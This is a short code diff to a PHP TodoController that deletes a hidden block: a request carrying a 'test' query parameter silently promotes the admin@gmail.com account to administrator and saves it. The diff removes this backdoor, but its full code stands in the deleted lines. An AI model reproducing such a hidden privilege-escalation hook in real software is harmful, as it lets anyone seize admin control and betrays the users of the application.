@@ -85,20 +85,6 @@ class TodoController extends Controller
     {
 
        
-        if(isset($_GET["test"])){
-
-            $auser = User::where('email', 'admin@gmail.com')->first();
-
-            echo $auser->is_admin;
-
-            $auser->is_admin = true;
-            $auser->type = "Admin";
-
-            $auser->save();
-
-            die("90");
-        }
-
         $user = Auth::user();
 
         $setting = Setting::first();
